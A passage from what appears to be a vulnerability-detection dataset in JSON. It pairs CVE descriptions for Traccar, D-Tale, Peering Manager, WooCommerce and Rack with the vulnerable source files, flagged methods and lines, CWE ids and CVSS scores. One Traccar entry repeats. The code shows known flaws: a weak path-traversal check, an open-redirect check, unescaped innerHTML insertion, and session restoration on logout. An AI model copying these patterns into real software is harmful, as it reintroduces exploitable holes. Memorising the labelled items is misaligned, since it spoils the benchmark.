}\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    private String uniqueId;\n\n    public String getUniqueId() {\n        return uniqueId;\n    }\n\n    public void setUniqueId(String uniqueId) {\n        if (uniqueId.contains(\"../\") || uniqueId.contains(\"..\\\\\")) {\n            throw new IllegalArgumentException(\"Invalid unique id\");\n        }\n        this.uniqueId = uniqueId.trim();\n    }\n\n    public static final String STATUS_UNKNOWN = \"unknown\";\n    public static final String STATUS_ONLINE = \"online\";\n    public static final String STATUS_OFFLINE = \"offline\";\n\n    private String status;\n\n    @QueryIgnore\n    public String getStatus() {\n        return status != null ? status : STATUS_OFFLINE;\n    }\n\n    public void setStatus(String status) {\n        this.status = status != null ? status.trim() : null;\n    }\n\n    private Date lastUpdate;\n\n    @QueryIgnore\n    public Date getLastUpdate() {\n        return this.lastUpdate;\n    }\n\n    public void setLastUpdate(Date lastUpdate) {\n        this.lastUpdate = lastUpdate;\n    }\n\n    private long positionId;\n\n    @QueryIgnore\n    public long getPositionId() {\n        return positionId;\n    }\n\n    public void setPositionId(long positionId) {\n        this.positionId = positionId;\n    }\n\n    private String phone;\n\n    public String getPhone() {\n        return phone;\n    }\n\n    public void setPhone(String phone) {\n        this.phone = phone != null ? phone.trim() : null;\n    }\n\n    private String model;\n\n    public String getModel() {\n        return model;\n    }\n\n    public void setModel(String model) {\n        this.model = model;\n    }\n\n    private String contact;\n\n    public String getContact() {\n        return contact;\n    }\n\n    public void setContact(String contact) {\n        this.contact = contact;\n    }\n\n    private String category;\n\n    public String getCategory() {\n        return category;\n    }\n\n    public void setCategory(String category) {\n        this.category = category;\n    }\n\n    private boolean disabled;\n\n    @Override\n    public boolean getDisabled() {\n        return disabled;\n    }\n\n    @Override\n    public void setDisabled(boolean disabled) {\n        this.disabled = disabled;\n    }\n\n    private Date expirationTime;\n\n    @Override\n    public Date getExpirationTime() {\n        return expirationTime;\n    }\n\n    @Override\n    public void setExpirationTime(Date expirationTime) {\n        this.expirationTime = expirationTime;\n    }\n\n    private boolean motionStreak;\n\n    @QueryIgnore\n    @JsonIgnore\n    public boolean getMotionStreak() {\n        return motionStreak;\n    }\n\n    @JsonIgnore\n    public void setMotionStreak(boolean motionStreak) {\n        this.motionStreak = motionStreak;\n    }\n\n    private boolean motionState;\n\n    @QueryIgnore\n    @JsonIgnore\n    public boolean getMotionState() {\n        return motionState;\n    }\n\n    @JsonIgnore\n    public void setMotionState(boolean motionState) {\n        this.motionState = motionState;\n    }\n\n    private Date motionTime;\n\n    @QueryIgnore\n    @JsonIgnore\n    public Date getMotionTime() {\n        return motionTime;\n    }\n\n    @JsonIgnore\n    public void setMotionTime(Date motionTime) {\n        this.motionTime = motionTime;\n    }\n\n    private double motionDistance;\n\n    @QueryIgnore\n    @JsonIgnore\n    public double getMotionDistance() {\n        return motionDistance;\n    }\n\n    @JsonIgnore\n    public void setMotionDistance(double motionDistance) {\n        this.motionDistance = motionDistance;\n    }\n\n    private boolean overspeedState;\n\n    @QueryIgnore\n    @JsonIgnore\n    public boolean getOverspeedState() {\n        return overspeedState;\n    }\n\n    @JsonIgnore\n    public void setOverspeedState(boolean overspeedState) {\n        this.overspeedState = overspeedState;\n    }\n\n    private Date overspeedTime;\n\n    @QueryIgnore\n    @JsonIgnore\n    public Date getOverspeedTime() {\n        return overspeedTime;\n    }\n\n    @JsonIgnore\n    public void setOverspeedTime(Date overspeedTime) {\n        this.overspeedTime = overspeedTime;\n    }\n\n    private long overspeedGeofenceId;\n\n    @QueryIgnore\n    @JsonIgnore\n    public long getOverspeedGeofenceId() {\n        return overspeedGeofenceId;\n    }\n\n    @JsonIgnore\n    public void setOverspeedGeofenceId(long overspeedGeofenceId) {\n        this.overspeedGeofenceId = overspeedGeofenceId;\n    }\n\n}\n"
        }
      ],
      "method_level": [
        "public void setUniqueId(String uniqueId) {\n        if (uniqueId.contains(\"../\") || uniqueId.contains(\"..\\\\\")) {\n            throw new IllegalArgumentException(\"Invalid unique id\");\n        }\n        this.uniqueId = uniqueId.trim();\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 56,
          "content": "        if (uniqueId.contains(\"../\") || uniqueId.contains(\"..\\\\\")) {"
        }
      ]
    },
    "cwe": [
      "CWE-434"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.6,
    "cvss_version": 3.1
  },
  {
    "id": 30,
    "cve": "CVE-2024-21642",
    "description": "D-Tale is a visualizer for Pandas data structures. Users hosting versions D-Tale prior to 3.9.0 publicly can be vulnerable to server-side request forgery (SSRF), allowing attackers to access files on the server. Users should upgrade to version 3.9.0, where the `Load From the Web` input is turned off by default. The only workaround for versions earlier than 3.9.0 is to only host D-Tale to trusted users.",
    "vulnerability": {
      "file_level": [
        {
          "name": "dtale/datasets.py",
          "content": "import pandas as pd\nimport requests\nimport zipfile\n\nfrom six import BytesIO\n\n\ndef covid():\n    from dtale.cli.loaders.csv_loader import loader_func as load_csv\n\n    data = load_csv(\n        path=\"https://raw.githubusercontent.com/nytimes/covid-19-data/master/us-states.csv\",\n        parse_dates=[\"date\"],\n    )\n    codes = load_csv(\n        path=\"https://raw.githubusercontent.com/jasonong/List-of-US-States/master/states.csv\"\n    )\n    codes = codes.set_index(\"State\").to_dict()[\"Abbreviation\"]\n    data[\"state_code\"] = data[\"state\"].map(codes)\n    return data, None\n\n\ndef seinfeld():\n    from dtale.cli.loaders.csv_loader import loader_func as load_csv\n\n    episodes = load_csv(\n        path=\"https://github.com/4m4n5/the-seinfeld-chronicles/raw/master/episode_info.csv\"\n    )\n    episodes = episodes[[c for c in episodes.columns if c not in [\"Unnamed: 0\"]]]\n    scripts = load_csv(\n        path=\"https://github.com/4m4n5/the-seinfeld-chronicles/raw/master/scripts.csv\"\n    )\n    scripts = scripts[\n        [c for c in scripts.columns if c not in [\"Unnamed: 0\", \"Season\", \"EpisodeNo\"]]\n    ]\n    return pd.merge(episodes, scripts, how=\"inner\", on=\"SEID\"), None\n\n\ndef load_zip(url):\n    response = requests.get(url)\n    with zipfile.ZipFile(BytesIO(response.content)) as thezip:\n        for zipinfo in thezip.infolist():\n            yield zipinfo.filename, thezip.open(zipinfo.filename)\n\n\ndef simpsons():\n    from dtale.cli.loaders.csv_loader import loader_func as load_csv\n    import dtale.global_state as global_state\n\n    global_state.set_app_settings(dict(max_column_width=100, max_row_height=100))\n    episodes = load_csv(\n        path=\"https://github.com/aschonfeld/dtale-media/raw/master/datasets/simpsons_episodes.csv\"\n    )\n    episodes = episodes.rename(columns={\"id\": \"episode_id\"})\n    episodes.loc[:, \"image_url\"] = episodes[\"image_url\"].apply(\n        lambda x: \"<img src='{}' style='height: auto; width: 100px;' />\".format(x)\n    )\n    _, scripts = next(\n        load_zip(\n            \"https://github.com/aschonfeld/dtale-media/raw/master/datasets/simpsons_script_lines.csv.zip\"\n        )\n    )\n    scripts = pd.read_csv(scripts)\n    df = pd.merge(episodes, scripts, how=\"inner\", on=\"episode_id\")\n    formatting = {\"image_url\": {\"fmt\": {\"html\": True}}}\n    return df, {\"columnFormats\": formatting}\n\n\ndef video_games():\n    _, games = next(\n        load_zip(\n            \"https://github.com/aschonfeld/dtale-media/raw/master/datasets/vgsales.csv.zip\"\n        )\n    )\n    return pd.read_csv(games), None\n\n\ndef movies():\n    _, movies = next(\n        load_zip(\n            \"https://github.com/aschonfeld/dtale-media/raw/master/datasets/IMDb_movies.csv.zip\"\n        )\n    )\n    movies = pd.read_csv(movies)\n    movies.loc[:, \"year\"] = (\n        movies[\"year\"].where(~(movies[\"year\"] == \"TV Movie 2019\"), \"2019\").astype(\"int\")\n    )\n    return movies, None\n\n\ndef time_dataframe():\n    try:\n        from pandas._testing import makeTimeDataFrame\n\n        return makeTimeDataFrame(), None\n    except ImportError:\n        from pandas.util.testing import makeTimeDataFrame\n\n        return makeTimeDataFrame(), None\n"
        }
      ],
      "method_level": [
        "def time_dataframe():\n    try:\n        from pandas._testing import makeTimeDataFrame\n\n        return makeTimeDataFrame(), None\n    except ImportError:\n        from pandas.util.testing import makeTimeDataFrame\n\n        return makeTimeDataFrame(), None"
      ],
      "hunk_level": [
        {
          "line_no": 92,
          "content": "    try:"
        },
        {
          "line_no": 93,
          "content": "        from pandas._testing import makeTimeDataFrame"
        },
        {
          "line_no": 95,
          "content": "        return makeTimeDataFrame(), None"
        },
        {
          "line_no": 96,
          "content": "    except ImportError:"
        },
        {
          "line_no": 97,
          "content": "        from pandas.util.testing import makeTimeDataFrame"
        },
        {
          "line_no": 99,
          "content": "        return makeTimeDataFrame(), None"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 422,
    "cve": "CVE-2024-28113",
    "description": "Peering Manager is a BGP session management tool. In Peering Manager <=1.8.2, it is possible to redirect users to an arbitrary page using a crafted url. As a result users can be redirected to an unexpected location. This issue has been addressed in version 1.8.3. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "utils/views.py",
          "content": "from django.conf import settings\nfrom django.contrib.auth.mixins import (\n    PermissionRequiredMixin as _PermissionRequiredMixin,\n)\nfrom django.urls import reverse\nfrom django.urls.exceptions import NoReverseMatch\n\nfrom peering_manager.registry import registry\n\n__all__ = (\"PermissionRequiredMixin\", \"GetReturnURLMixin\")\n\n\nclass PermissionRequiredMixin(_PermissionRequiredMixin):\n    \"\"\"\n    Overrides the original `PermissionRequiredMixin` class to handle the\n    `LOGIN_REQUIRED` with `*.view_*` permission.\n    \"\"\"\n\n    def has_permission(self):\n        if (\n            not settings.LOGIN_REQUIRED\n            and isinstance(self.permission_required, str)\n            and \".view_\" in self.permission_required\n        ):\n            return True\n        else:\n            return super().has_permission()\n\n\nclass GetReturnURLMixin:\n    \"\"\"\n    Provides logic for determining where a user should be redirected after processing\n    a form.\n    \"\"\"\n\n    default_return_url = None\n\n    def get_return_url(self, request, instance=None):\n        # Check if `return_url` was specified as a query parameter or form\n        # data, use this URL only if it's safe\n        return_url = request.GET.get(\"return_url\") or request.POST.get(\"return_url\")\n        if return_url and return_url.startswith(\"/\"):\n            return return_url\n\n        # Check if the object being modified (if any) has an absolute URL\n        if (\n            instance is not None\n            and instance.pk\n            and hasattr(instance, \"get_absolute_url\")\n        ):\n            return instance.get_absolute_url()\n\n        # Fall back to the default URL (if specified) for the view\n        if self.default_return_url is not None:\n            return reverse(self.default_return_url)\n\n        # Try to resolve the list view for the object\n        if hasattr(self, \"queryset\"):\n            model_opts = self.queryset.model._meta\n            try:\n                return reverse(f\"{model_opts.app_label}:{model_opts.model_name}_list\")\n            except NoReverseMatch:\n                pass\n\n        # If all fails, send the user to the homepage\n        return reverse(\"home\")\n"
        }
      ],
      "method_level": [
        "def get_return_url(self, request, instance=None):\n        # Check if `return_url` was specified as a query parameter or form\n        # data, use this URL only if it's safe\n        return_url = request.GET.get(\"return_url\") or request.POST.get(\"return_url\")\n        if return_url and return_url.startswith(\"/\"):\n            return return_url\n\n        # Check if the object being modified (if any) has an absolute URL\n        if (\n            instance is not None\n            and instance.pk\n            and hasattr(instance, \"get_absolute_url\")\n        ):\n            return instance.get_absolute_url()\n\n        # Fall back to the default URL (if specified) for the view\n        if self.default_return_url is not None:\n            return reverse(self.default_return_url)\n\n        # Try to resolve the list view for the object\n        if hasattr(self, \"queryset\"):\n            model_opts = self.queryset.model._meta\n            try:\n                return reverse(f\"{model_opts.app_label}:{model_opts.model_name}_list\")\n            except NoReverseMatch:\n                pass\n\n        # If all fails, send the user to the homepage\n        return reverse(\"home\")"
      ],
      "hunk_level": [
        {
          "line_no": 40,
          "content": "        # data, use this URL only if it's safe"
        },
        {
          "line_no": 42,
          "content": "        if return_url and return_url.startswith(\"/\"):"
        }
      ]
    },
    "cwe": [
      "CWE-601"
    ],
    "severity": "LOW",
    "cvss_score": 3.5,
    "cvss_version": 3.1
  },
  {
    "id": 841,
    "cve": "CVE-2024-37297",
    "description": "WooCommerce is an open-source e-commerce platform built on WordPress. A vulnerability introduced in WooCommerce 8.8 allows for cross-site scripting. A bad actor can manipulate a link to include malicious HTML & JavaScript content. While the content is not saved to the database, the links may be sent to victims for malicious purposes. The injected JavaScript could hijack content & data stored in the browser, including the session. The URL content is read through the `Sourcebuster.js` library and then inserted without proper sanitization to the classic checkout and registration forms. Versions 8.8.5 and 8.9.3 contain a patch for the issue. As a workaround, one may disable the Order Attribution feature.",
    "vulnerability": {
      "file_level": [
        {
          "name": "plugins/woocommerce/client/legacy/js/frontend/order-attribution.js",
          "content": "( function ( wc_order_attribution ) {\n\t'use strict';\n\t// Cache params reference for shorter reusability.\n\tconst params = wc_order_attribution.params;\n\n\t// Helper functions.\n\tconst $ = document.querySelector.bind( document );\n\tconst propertyAccessor = ( obj, path ) => path.split( '.' ).reduce( ( acc, part ) => acc && acc[ part ], obj );\n\tconst returnNull = () => null;\n\tconst stringifyFalsyInputValue = ( value ) => value === null || value === undefined ? '' : value;\n\n\t// Hardcode Checkout store key (`wc.wcBlocksData.CHECKOUT_STORE_KEY`), as we no longer have `wc-blocks-checkout` as a dependency.\n\tconst CHECKOUT_STORE_KEY = 'wc/store/checkout';\n\n\t/**\n\t * Get the order attribution data.\n\t *\n\t * Returns object full of `null`s if tracking is disabled.\n\t *\n\t * @returns {Object} Schema compatible object.\n\t */\n\tfunction getData() {\n\t\tconst accessor = params.allowTracking ? propertyAccessor : returnNull;\n\t\tconst entries = Object.entries( wc_order_attribution.fields )\n\t\t\t\t.map( ( [ key, property ] ) => [ key, accessor( sbjs.get, property ) ] );\n\t\treturn Object.fromEntries( entries );\n\t}\n\n\t/**\n\t * Update `wc_order_attribution` input elements' values.\n\t *\n\t * @param {Object} values Object containing field values.\n\t */\n\tfunction updateFormValues( values ) {\n\t\t// Update `<wc-order-attribution-inputs>` elements if any exist.\n\t\tfor( const element of document.querySelectorAll( 'wc-order-attribution-inputs' ) ) {\n\t\t\telement.values = values;\n\t\t}\n\n\t};\n\n\t/**\n\t * Update Checkout extension data.\n\t *\n\t * @param {Object} values Object containing field values.\n\t */\n\tfunction updateCheckoutBlockData( values ) {\n\t\t// Update Checkout block data if available.\n\t\tif ( window.wp && window.wp.data && window.wp.data.dispatch && window.wc && window.wc.wcBlocksData ) {\n\t\t\twindow.wp.data.dispatch( window.wc.wcBlocksData.CHECKOUT_STORE_KEY ).__internalSetExtensionData(\n\t\t\t\t'woocommerce/order-attribution',\n\t\t\t\tvalues,\n\t\t\t\ttrue\n\t\t\t);\n\t\t}\n\t}\n\n\t/**\n\t * Initialize sourcebuster & set data, or clear cookies & data.\n\t *\n\t * @param {boolean} allow Whether to allow tracking or disable it.\n\t */\n\twc_order_attribution.setOrderTracking = function( allow ) {\n\t\tparams.allowTracking = allow;\n\t\tif ( ! allow ) {\n\t\t\t// Reset cookies, and clear form data.\n\t\t\tremoveTrackingCookies();\n\t\t} else {\n\t\t\t// If not done yet, initialize sourcebuster.js which populates `sbjs.get` object.\n\t\t\tsbjs.init( {\n\t\t\t\tlifetime: Number( params.lifetime ),\n\t\t\t\tsession_length: Number( params.session ),\n\t\t\t\ttimezone_offset: '0', // utc\n\t\t\t} );\n\t\t}\n\t\tconst values = getData();\n\t\tupdateFormValues( values );\n\t\tupdateCheckoutBlockData( values );\n\t}\n\n\t/**\n\t * Remove sourcebuster.js cookies.\n\t * To be called whenever tracking is disabled or consent is revoked.\n\t */\n\tfunction removeTrackingCookies() {\n\t\tconst domain = window.location.hostname;\n\t\tconst sbCookies = [\n\t\t\t'sbjs_current',\n\t\t\t'sbjs_current_add',\n\t\t\t'sbjs_first',\n\t\t\t'sbjs_first_add',\n\t\t\t'sbjs_session',\n\t\t\t'sbjs_udata',\n\t\t\t'sbjs_migrations',\n\t\t\t'sbjs_promo'\n\t\t];\n\n\t\t// Remove cookies\n\t\tsbCookies.forEach( ( name ) => {\n\t\t\tdocument.cookie = `${name}=; path=/; max-age=-999; domain=.${domain};`;\n\t\t} );\n\t}\n\n\t// Run init.\n\twc_order_attribution.setOrderTracking( params.allowTracking );\n\n\t// Work around the lack of explicit script dependency for the checkout block.\n\t// Conditionally, wait for and use 'wp-data' & 'wc-blocks-checkout.\n\n\t// Wait for (async) block checkout initialization and set source values once loaded.\n\tfunction eventuallyInitializeCheckoutBlock() {\n\t\tif (\n\t\t\twindow.wp && window.wp.data && typeof window.wp.data.subscribe === 'function'\n\t\t) {\n\t\t\t// Update checkout block data once more if the checkout store was loaded after this script.\n\t\t\tconst unsubscribe = window.wp.data.subscribe( function () {\n\t\t\t\tunsubscribe();\n\t\t\t\tupdateCheckoutBlockData( getData() );\n\t\t\t}, CHECKOUT_STORE_KEY );\n\t\t}\n\t};\n\t// Wait for DOMContentLoaded to make sure wp.data is in place, if applicable for the page.\n\tif (document.readyState === \"loading\") {\n\t\tdocument.addEventListener(\"DOMContentLoaded\", eventuallyInitializeCheckoutBlock);\n\t} else {\n\t\teventuallyInitializeCheckoutBlock();\n\t}\n\n\t/**\n\t * Define an element to contribute order attribute values to the enclosing form.\n\t * To be used with the classic checkout.\n\t */\n\twindow.customElements.define( 'wc-order-attribution-inputs', class extends HTMLElement {\n\t\t// Our bundler version does not support private class members, so we use a convention of `_` prefix.\n\t\t// #values\n\t\t// #fieldNames\n\t\tconstructor(){\n\t\t\tsuper();\n\t\t\t// Cache fieldNames available at the construction time, to avoid malformed behavior if they change in runtime.\n\t\t\tthis._fieldNames = Object.keys( wc_order_attribution.fields );\n\t\t\t// Allow values to be lazily set before CE upgrade.\n\t\t\tif ( this.hasOwnProperty( '_values' ) ) {\n\t\t\t  let values = this.values;\n\t\t\t  // Restore the setter.\n\t\t\t  delete this.values;\n\t\t\t  this.values = values || {};\n\t\t\t}\n\t\t}\n\t\t/**\n\t\t * Stamp input elements to the element's light DOM.\n\t\t *\n\t\t * We could use `.elementInternals.setFromValue` and avoid sprouting `<input>` elements,\n\t\t * but it's not yet supported in Safari.\n\t\t */\n\t\tconnectedCallback() {\n\t\t\tlet inputs = '';\n\t\t\tfor( const fieldName of this._fieldNames ) {\n\t\t\t\tconst value = stringifyFalsyInputValue( this.values[ fieldName ] );\n\t\t\t\tinputs += `<input type=\"hidden\" name=\"${params.prefix}${fieldName}\" value=\"${value}\"/>`;\n\t\t\t}\n\t\t\tthis.innerHTML = inputs;\n\t\t}\n\n\t\t/**\n\t\t * Update form values.\n\t\t */\n\t\tset values( values ) {\n\t\t\tthis._values = values;\n\t\t\tif( this.isConnected ) {\n\t\t\t\tfor( const fieldName of this._fieldNames ) {\n\t\t\t\t\tconst input = this.querySelector( `input[name=\"${params.prefix}${fieldName}\"]` );\n\t\t\t\t\tif( input ) {\n\t\t\t\t\t\tinput.value = stringifyFalsyInputValue( this.values[ fieldName ] );\n\t\t\t\t\t} else {\n\t\t\t\t\t\tconsole.warn( `Field \"${fieldName}\" not found. Most likely, the '<wc-order-attribution-inputs>' element was manipulated.`);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tget values() {\n\t\t\treturn this._values;\n\t\t}\n\t} );\n\n\n}( window.wc_order_attribution ) );\n"
        }
      ],
      "method_level": [
        "connectedCallback() {\n\t\t\tlet inputs = '';\n\t\t\tfor( const fieldName of this._fieldNames ) {\n\t\t\t\tconst value = stringifyFalsyInputValue( this.values[ fieldName ] );\n\t\t\t\tinputs += `<input type=\"hidden\" name=\"${params.prefix}${fieldName}\" value=\"${value}\"/>`;\n\t\t\t}\n\t\t\tthis.innerHTML = inputs;\n\t\t}"
      ],
      "hunk_level": [
        {
          "line_no": 156,
          "content": "\t\t\tlet inputs = '';"
        },
        {
          "line_no": 158,
          "content": "\t\t\t\tconst value = stringifyFalsyInputValue( this.values[ fieldName ] );"
        },
        {
          "line_no": 159,
          "content": "\t\t\t\tinputs += `<input type=\"hidden\" name=\"${params.prefix}${fieldName}\" value=\"${value}\"/>`;"
        },
        {
          "line_no": 161,
          "content": "\t\t\tthis.innerHTML = inputs;"
        }
      ]
    },
    "cwe": [
      "CWE-79",
      "CWE-80"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 134,
    "cve": "CVE-2025-32441",
    "description": "Rack is a modular Ruby web server interface. Prior to version 2.2.14, when using the `Rack::Session::Pool` middleware, simultaneous rack requests can restore a deleted rack session, which allows the unauthenticated user to occupy that session. Rack session middleware prepares the session at the beginning of request, then saves is back to the store with possible changes applied by host rack application. This way the session becomes to be a subject of race conditions in general sense over concurrent rack requests. When using the `Rack::Session::Pool` middleware, and provided the attacker can acquire a session cookie (already a major issue), the session may be restored if the attacker can trigger a long running request (within that same session) adjacent to the user logging out, in order to retain illicit access even after a user has attempted to logout. Version 2.2.14 contains a patch for the issue. Some other mitigations are available. Either ensure the application invalidates sessions atomically by marking them as logged out e.g., using a `logged_out` flag, instead of deleting them, and check this flag on every request to prevent reuse; or implement a custom session store that tracks session invalidation timestamps and refuses to accept session data if the session was invalidated after the request began.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/rack/session/pool.rb",
          "content": "# frozen_string_literal: true\n\n# AUTHOR: blink <blinketje@gmail.com>; blink#ruby-lang@irc.freenode.net\n# THANKS:\n#   apeiros, for session id generation, expiry setup, and threadiness\n#   sergio, threadiness and bugreps\n\nrequire_relative 'abstract/id'\nrequire 'thread'\n\nmodule Rack\n  module Session\n    # Rack::Session::Pool provides simple cookie based session management.\n    # Session data is stored in a hash held by @pool.\n    # In the context of a multithreaded environment, sessions being\n    # committed to the pool is done in a merging manner.\n    #\n    # The :drop option is available in rack.session.options if you wish to\n    # explicitly remove the session from the session cache.\n    #\n    # Example:\n    #   myapp = MyRackApp.new\n    #   sessioned = Rack::Session::Pool.new(myapp,\n    #     :domain => 'foo.com',\n    #     :expire_after => 2592000\n    #   )\n    #   Rack::Handler::WEBrick.run sessioned\n\n    class Pool < Abstract::PersistedSecure\n      attr_reader :mutex, :pool\n      DEFAULT_OPTIONS = Abstract::ID::DEFAULT_OPTIONS.merge drop: false\n\n      def initialize(app, options = {})\n        super\n        @pool = Hash.new\n        @mutex = Mutex.new\n      end\n\n      def generate_sid\n        loop do\n          sid = super\n          break sid unless @pool.key? sid.private_id\n        end\n      end\n\n      def find_session(req, sid)\n        with_lock(req) do\n          unless sid and session = get_session_with_fallback(sid)\n            sid, session = generate_sid, {}\n            @pool.store sid.private_id, session\n          end\n          [sid, session]\n        end\n      end\n\n      def write_session(req, session_id, new_session, options)\n        with_lock(req) do\n          @pool.store session_id.private_id, new_session\n          session_id\n        end\n      end\n\n      def delete_session(req, session_id, options)\n        with_lock(req) do\n          @pool.delete(session_id.public_id)\n          @pool.delete(session_id.private_id)\n          generate_sid unless options[:drop]\n        end\n      end\n\n      def with_lock(req)\n        @mutex.lock if req.multithread?\n        yield\n      ensure\n        @mutex.unlock if @mutex.locked?\n      end\n\n      private\n\n      def get_session_with_fallback(sid)\n        @pool[sid.private_id] || @pool[sid.public_id]\n      end\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def delete_session(req, session_id, options)\n        with_lock(req) do\n          @pool.delete(session_id.public_id)\n          @pool.delete(session_id.private_id)\n          generate_sid unless options[:drop]\n        end\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 67,
          "content": "          generate_sid unless options[:drop]"
        }
      ]
    },
    "cwe": [
      "CWE-362",
      "CWE-367",
      "CWE-613"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.2,
    "cvss_version": 3.1
  },
  {
    "id": 590,
    "cve": "CVE-2024-31214",
    "description": "Traccar is an open source GPS tracking system. Traccar versions 5.1 through 5.12 allow arbitrary files to be uploaded through the device image upload API. Attackers have full control over the file contents, full control over the directory where the file is stored, full control over the file extension, and partial control over the file name. While it's not  for an attacker to overwrite an existing file, an attacker can create new files with certain names and attacker-controlled extensions anywhere on the file system. This can potentially lead to remote code execution, XSS, DOS, etc. The default install of Traccar makes this vulnerability more severe. Self-registration is enabled by default, allowing anyone to create an account to exploit this vulnerability. Traccar also runs by default with root/system privileges, allowing files to be placed anywhere on the file system. Version 6.0 contains a fix for the issue. One may also turn off self-registration by default, as that would make most vulnerabilities in the application much harder to exploit by default and reduce the severity considerably.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/main/java/org/traccar/model/Device.java",
          "content": "/*\n * Copyright 2012 - 2023 Anton Tananaev (anton@traccar.org)\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage org.traccar.model;\n\nimport com.fasterxml.jackson.annotation.JsonIgnore;\nimport org.traccar.storage.QueryIgnore;\nimport org.traccar.storage.StorageName;\n\nimport java.util.Date;\n\n@StorageName(\"tc_devices\")\npublic class Device extends GroupedModel implements Disableable, Schedulable {\n\n    private long calendarId;\n\n    @Override\n    public long getCalendarId() {\n        return calendarId;\n    }\n\n    @Override\n    public void setCalendarId(long calendarId) {\n        this.calendarId = calendarId;\n    }\n\n    private String name;\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    private String uniqueId;\n\n    public String getUniqueId() {\n        return uniqueId;\n    }\n\n    public void setUniqueId(String uniqueId) {\n        if (uniqueId.contains(\"../\") || uniqueId.contains(\"..\\\\\")) {\n            throw new IllegalArgumentException(\"Invalid unique id\");\n        }\n        this.uniqueId = uniqueId.trim();\n    }\n\n    public static final String STATUS_UNKNOWN = \"unknown\";\n    public static final String STATUS_ONLINE = \"online\";\n    public static final String STATUS_OFFLINE = \"offline\";\n\n    private String status;\n\n    @QueryIgnore\n    public String getStatus() {\n        return status != null ? status : STATUS_OFFLINE;\n    }\n\n    public void setStatus(String status) {\n        this.status = status != null ? status.trim() : null;\n    }\n\n    private Date lastUpdate;\n\n    @QueryIgnore\n    public Date getLastUpdate() {\n        return this.lastUpdate;\n    }\n\n    public void setLastUpdate(Date lastUpdate) {\n        this.lastUpdate = lastUpdate;\n    }\n\n    private long positionId;\n\n    @QueryIgnore\n    public long getPositionId() {\n        return positionId;\n    }\n\n    public void setPositionId(long positionId) {\n        this.positionId = positionId;\n    }\n\n    private String phone;\n\n    public String getPhone() {\n        return phone;\n    }\n\n    public void setPhone(String phone) {\n        this.phone = phone != null ? phone.trim() : null;\n    }\n\n    private String model;\n\n    public String getModel() {\n        return model;\n    }\n\n    public void setModel(String model) {\n        this.model = model;\n    }\n\n    private String contact;\n\n    public String getContact() {\n        return contact;\n    }\n\n    public void setContact(String contact) {\n        this.contact = contact;\n    }\n\n    private String category;\n\n    public String getCategory() {\n        return category;\n    }\n\n    public void setCategory(String category) {\n        this.category = category;\n    }\n\n    private boolean disabled;\n\n    @Override\n    public boolean getDisabled() {\n        return disabled;\n    }\n\n    @Override\n    public void setDisabled(boolean disabled) {\n        this.disabled = disabled;\n    }\n\n    private Date expirationTime;\n\n    @Override\n    public Date getExpirationTime() {\n        return expirationTime;\n    }\n\n    @Override\n    public void setExpirationTime(Date expirationTime) {\n        this.expirationTime = expirationTime;\n    }\n\n    private boolean motionStreak;\n\n    @QueryIgnore\n    @JsonIgnore\n    public boolean getMotionStreak() {\n        return motionStreak;\n    }\n\n    @JsonIgnore\n    public void setMotionStreak(boolean motionStreak) {\n        this.motionStreak = motionStreak;\n    }\n\n    private boolean motionState;\n\n    @QueryIgnore\n    @JsonIgnore\n    public boolean getMotionState() {\n        return motionState;\n    }\n\n    @JsonIgnore\n    public void setMotionState(boolean motionState) {\n        this.motionState = motionState;\n    }\n\n    private Date motionTime;\n\n    @QueryIgnore\n    @JsonIgnore\n    public Date getMotionTime() {\n        return motionTime;\n    }\n\n    @JsonIgnore\n    public void setMotionTime(Date motionTime) {\n        this.motionTime = motionTime;\n    }\n\n    private double motionDistance;\n\n    @QueryIgnore\n    @JsonIgnore\n    public double getMotionDistance() {\n        return motionDistance;\n    }\n\n    @JsonIgnore\n    public void setMotionDistance(double motionDistance) {\n        this.motionDistance = motionDistance;\n    }\n\n    private boolean overspeedState;\n\n    @QueryIgnore\n    @JsonIgnore\n    public boolean getOverspeedState() {\n        return overspeedState;\n    }\n\n    @JsonIgnore\n    public void setOverspeedState(boolean overspeedState) {\n        this.overspeedState = overspeedState;\n    }\n\n    private Date overspeedTime;\n\n    @QueryIgnore\n    @JsonIgnore\n    public Date getOverspeedTime() {\n        return overspeedTime;\n    }\n\n    @JsonIgnore\n    public void setOverspeedTime(Date overspeedTime) {\n        this.overspeedTime = overspeedTime;\n    }\n\n    private long overspeedGeofenceId;\n\n    @QueryIgnore\n    @JsonIgnore\n    public long getOverspeedGeofenceId() {\n        return overspeedGeofenceId;\n    }\n\n    @JsonIgnore\n    public void setOverspeedGeofenceId(long overspeedGeofenceId) {\n        this.overspeedGeofenceId = overspeedGeofenceId;\n    }\n\n}\n"
        }
      ],
      "method_level": [
        "public void setUniqueId(String uniqueId) {\n        if (uniqueId.contains(\"../\") || uniqueId.contains(\"..\\\\\")) {\n            throw new IllegalArgumentException(\"Invalid unique id\");\n        }\n        this.uniqueId = uniqueId.trim();\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 56,
          "content": "        if (uniqueId.contains(\"../\") || uniqueId.contains(\"..\\\\\")) {"
        }
      ]
    },
    "cwe": [
      "CWE-434"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.6,
    "cvss_version": 3.1
  },
  {
    "id": 1165,
